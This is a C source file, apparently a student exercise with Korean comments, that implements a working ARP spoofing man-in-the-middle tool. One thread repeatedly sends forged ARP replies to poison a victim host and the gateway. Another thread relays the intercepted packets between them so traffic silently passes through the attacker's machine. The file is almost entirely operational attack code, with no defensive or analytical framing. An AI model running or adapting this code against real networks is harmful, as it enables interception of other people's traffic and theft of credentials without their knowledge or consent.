#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <stdlib.h>
#include <netinet/in.h>
#include "arpheader.h"


void* thread_infect (void* arg)   //감염패킷킷
{

    char errbuf [PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live("wlan0",BUFSIZ,1,1,errbuf);

        struct jsave * addr_save = (struct jsave *)arg;

      u_char pkt[PACKETSIZE];
      struct allpacket * infect =(struct allpacket *) pkt;

      int sw=1;
      while(1)
      {

      //패킷 입력 시

//       dmac search------------------------------------- Destination 입력
//          printf("#########################################감염 패킷 \n");
//          printf("dmac ::");

          if(sw>2)sw=1;
          if(sw==1) for(int i=0; i<=5;i++) infect->eth_dmac[i] = addr_save->save_smac[i]; //목적지 받은은 패킷의 시작 주소
          else for(int i=0; i<=5;i++) infect->eth_dmac[i] = addr_save->gateway[i];
          printf("\n");
          //smac --------------------------------------------

            for(int i=0; i<=5;i++) infect->eth_smac[i] = mymac[i];  //보낼 패킷의 시작은 나의 mac 입력

              infect->type = ntohs(0x0806);                       //  ARP 0x0806
              infect->hd_type = ntohs(0x0001);                    // HardWare type : ethernet 1
              infect->protocol_type = ntohs(0x0800);               // Protocol type : IPv4 0x0800
              infect->hd_size = 0x06;                             // Hardware size 6 , Protocol size 4
              infect->protocol_size = 0x04;
              infect->opcode = ntohs(0x0002);                     // OPcode 1 = request ,2 = reply

//              printf("sender mac : ");                        // 나의 mac 입력
              for(int i=0; i<=5;i++) infect->arp_sender_mac[i] = infect->eth_smac[i] ;
//              printf("\n");
                                                            //sender(피해자)의 IP (게이트웨이)
              //inet_aton(addr_save->save_tip,&s_packet->arp_sender_ip);
              if(sw==1) infect->arp_sender_ip = addr_save->save_tip;
              else infect->arp_sender_ip = addr_save->save_sip;
//              printf("Sender IP %x \n",infect->arp_sender_ip);
//              printf("\n");


//              printf("Target Mac : ");                      // 속일 mac 주소 (감염시킬 pc의 주소)
              if(sw==1) for(int i=0; i<=5;i++) infect->arp_target_mac[i] = addr_save->save_smac[i] ;  //받은 패킷의 시작 주소
              else for(int i=0; i<=5;i++) infect->arp_target_mac[i] = addr_save->gateway[i];
//              printf("\n");


              //inet_aton(addr_save->save_sip,&s_packet->arp_target_ip);  // 감염시키려는 ip 주소
              if(sw==1) infect->arp_target_ip = addr_save->save_sip;
              else infect->arp_target_ip = addr_save->save_tip;
//              printf("target IP = %x \n", infect->arp_target_ip);


              int res = pcap_sendpacket(handle,pkt,sizeof(pkt));
               sw+=1;
              if(res == -1)
                     printf(" error\n");
              else
                    printf("감염패킷 전송 성공! \n");

            sleep(3);
        }
}

void* thread_relay (void* arg)
{
    struct jsave * add_save = (struct jsave *) arg;
    char errbuf [PCAP_ERRBUF_SIZE];
    int res;
    pcap_t* handle = pcap_open_live("wlan0",BUFSIZ,1,1,errbuf);
    struct pcap_pkthdr * header;
    const u_char* packet;


    while(1)
    {
       pcap_next_ex(handle,&header,&packet);

       u_int pktsize = header->caplen;
       u_char cp_packet[pktsize];
       // struct iphdr * ip_hdr = (struct iphdr *)add_save->packet +14;
       struct ether_header * eth_hdr = (struct ether_header *)packet;
       struct iphdr * ip_hdr = (struct iphdr *)(14 + packet) ;
//       printf("====================================================\n");
//        printf("리플라이 게이트 웨이 확인 ::");
//       for(int i=0;i<6;i++) printf(" %x ", add_save->gateway[i]);;
//        printf("\n");

        if(ip_hdr->daddr == inet_addr(myip)) continue;


//for(int i=6;i<6; i++) printf(" %02x ",);

       if(check_mac(eth_hdr->ether_shost,add_save->save_smac)==1 && ip_hdr->saddr == add_save->save_sip)
       {

          for(int i =0;i<6;i++){
              eth_hdr->ether_dhost[i]=add_save->gateway[i];
              eth_hdr->ether_shost[i]=mymac[i];
          }
            memcpy(cp_packet,packet,pktsize);
            res = pcap_sendpacket(handle,cp_packet,(int)pktsize);
            if(res == -1){
                  printf(" error\n");
                  continue;
           }
           else{
                 printf("Sender relay 전송 성공! \n");
                 continue;
           }
/*
           printf("====================================================\n");
           printf("Relay 보낸 후 패킷 확인 \n");
           printf("dmac :");
           for(int i=0;i<6;i++)
               printf(" %02x ",eth_hdr->ether_dhost[i]);
           printf("\n");

           printf("smac :");
           for(int i=0;i<6;i++)
               printf(" %02x ",eth_hdr->ether_shost[i]);
           printf("\n");
           printf("type : %04x\n",ntohs(eth_hdr->ether_type));
           printf("====================================================\n");
*/

//           printf("Search\n");
        }

//        for(int i=0;i<6;i++) printf(" %02x ", eth_hdr->ether_dhost[i]);
//        printf("\n");
//        for(int i=0;i<6;i++) printf(" %02x ", mymac[i]);
//        printf("IP Chck \" %x || %x\" \n",ip_hdr->daddr,add_save->save_sip);
       // && ip_hdr->daddr == add_save->save_sip

//       printf("확인 작업중 :: %x || %x || %x \n",ip_hdr->daddr,add_save->save_sip,inet_addr((myip)));
       if(check_mac(eth_hdr->ether_shost,add_save->gateway)==1 && ip_hdr->daddr == add_save->save_sip)
       {

          for(int i =0;i<6;i++){
              eth_hdr->ether_dhost[i]=add_save->save_smac[i];
              eth_hdr->ether_shost[i]=mymac[i];
          }
            memcpy(cp_packet,packet,pktsize);
            res = pcap_sendpacket(handle,cp_packet,(int)pktsize);
           if(res == -1)
                  printf(" error\n");
           else
                 printf("relay 전송 성공! \n");
/*
           printf("====================================================\n");
           printf("Relay 보낸 후 패킷 확인 \n");
           printf("dmac :");
           for(int i=0;i<6;i++)
               printf(" %02x ",eth_hdr->ether_dhost[i]);
           printf("\n");

           printf("smac :");
           for(int i=0;i<6;i++)
               printf(" %02x ",eth_hdr->ether_shost[i]);
           printf("\n");
           printf("type : %04x\n",ntohs(eth_hdr->ether_type));
           printf("====================================================\n");
*/

//           printf("Search\n");
        }



    }

}

int check_mac(u_int8_t *mac1, u_int8_t *mac2)
{
    for(int i =0;i<6;i++)
        if(mac1[i] != mac2[i]) return 0;

    return 1;
//    printf("=================================================Check %d \n",cnt);

}

int main(int argc, char* argv[]) {

      if (argc <= 2 || argc%2 == 1) {
         printf("error\n");
         return -1;
       }

      //my mac 구하는 함수  -------------------------------
     struct ifreq s;
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

     strcpy(s.ifr_name, "wlan0");
     ioctl(fd, SIOCGIFHWADDR, &s);

//     printf("My Mac Address : ");
     for (int x = 0; x < 6; ++x){
//     printf("%02x ", (u_char) s.ifr_addr.sa_data[x]);
     mymac[x] = (u_int8_t)s.ifr_addr.sa_data[x];
     }
//     printf("\n");

     //--------------------------------------------

     struct ifreq ifr;

     int ss;

     ss = socket(AF_INET,SOCK_DGRAM,0);
     strncpy(ifr.ifr_name,"wlan0",IFNAMSIZ);

     if(ioctl(ss,SIOCGIFADDR,&ifr)<0){
         printf("아이피 구하지 못힘 \n");
     } else {
         inet_ntop(AF_INET,ifr.ifr_addr.sa_data+2, myip,sizeof(struct sockaddr));
//         printf("나의 아이피는 : %s \n",myip);
     }

      pcap_t *handle;
      const u_char* packet;
      struct pcap_pkthdr* header;

      char* dev = argv[1];
      char errbuf[PCAP_ERRBUF_SIZE];
      handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
      if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
      }

      for(int i=1;i<=argc/2-1;i++)
      {
        broadcast(argv,handle);       //최초 감염 시작. for문 다 돌기전에 reply 패킷 오는지 확인 해야함.
      }

//------------------------------------------------------------------------------------------------------
      struct jsave * addr_save;
      struct jsave jsave;

      pthread_t jthread[2];
      while(1){                                                 //감염 패킷 쓰레드
          pcap_next_ex(handle,&header,&packet);
          struct allpacket * new_packet = (struct allpacket *)packet;


          addr_save = (struct jsave *) malloc(sizeof (struct jsave));
          if(ntohs(new_packet->type)==ETHERTYPE_ARP && ntohs(new_packet->opcode) == ARPOP_REPLY && new_packet->arp_sender_ip ==inet_addr(argv[2]))
          {
                addr_save->save_sip = new_packet->arp_sender_ip;
                addr_save->save_tip = new_packet->arp_target_ip;
              for(int i=0;i<6;i++)
              {
                 addr_save->save_smac[i]=new_packet->eth_smac[i];
              }

              pthread_create(&jthread[0],NULL,thread_infect,(void *)addr_save);            //감염함수 :: 성공
              break;
          }
         }
//-----------------------------------------------------------------------------------------------------
      sleep(2);
      gateway_mac(argv,handle);

      sleep(1);
//      printf("게이트웨이 주소 !\n");
      while(1)
      {
         pcap_next_ex(handle,&header,&packet);
         struct allpacket * rcv_packet = (struct allpacket *) packet;
/*
         printf("==== memcmp %d \n",memcmp(&rcv_packet->arp_target_ip,&myip,sizeof ((rcv_packet->arp_sender_ip))));

         printf("dmac=      ");
        for(int i=0;i<6;i++) printf(" %x ", rcv_packet->eth_dmac[i]);;
         printf("\n");
         printf("smac=      ");
        for(int i=0;i<6;i++) printf(" %x ", rcv_packet->eth_smac[i]);;
         printf("\n");
         printf("type       %x \n",ntohs(rcv_packet->type));
         printf("opcode     %d \n",ntohs(rcv_packet->opcode));
         printf("snder iP   %x \n",rcv_packet->arp_sender_ip);
         printf("SendMac");
         for(int i=0;i<6;i++) printf(" %02x ",rcv_packet->arp_sender_mac[i]);
         printf("\n");

         printf("Target ip  %x \n",rcv_packet->arp_target_ip);
         printf("targetMac");
         for(int i=0;i<6;i++) printf(" %02x ",rcv_packet->arp_target_mac[i]);
         printf("\n");

         printf("MyMac");
         for(int i=0;i<6;i++) printf(" %02x ",mymac[i]);
         printf("\n");
*/
        if(check_mac(rcv_packet->eth_dmac,mymac) == 1 &&rcv_packet->arp_sender_ip == addr_save->save_tip && ntohs(rcv_packet->type) == ETHERTYPE_ARP && ntohs(rcv_packet->opcode) == ARPOP_REPLY)
            {
//                printf("게이트웨이 주소 획득! \n");
                for(int i =0;i<6;i++){
                    //memcpy(addr_save->gateway[i],rcv_packet->eth_smac[i],sizeof(rcv_packet->eth_smac));
                    addr_save->gateway[i]=rcv_packet->eth_smac[i];
//                    printf("%02x ",(unsigned int)addr_save->gateway[i]);
                }
//                printf("\n");
//                printf("\n");
                break;
            }
         else {
//             printf("값이 다름 : \n");
         }



      }

//      printf("종료 !! \n");
      pthread_create(&jthread[1],NULL,thread_relay,(void *)addr_save);

      while(1)
      {
         sleep(1);
         printf("Search\n");

      }
      pcap_close(handle);
      return 0;
}

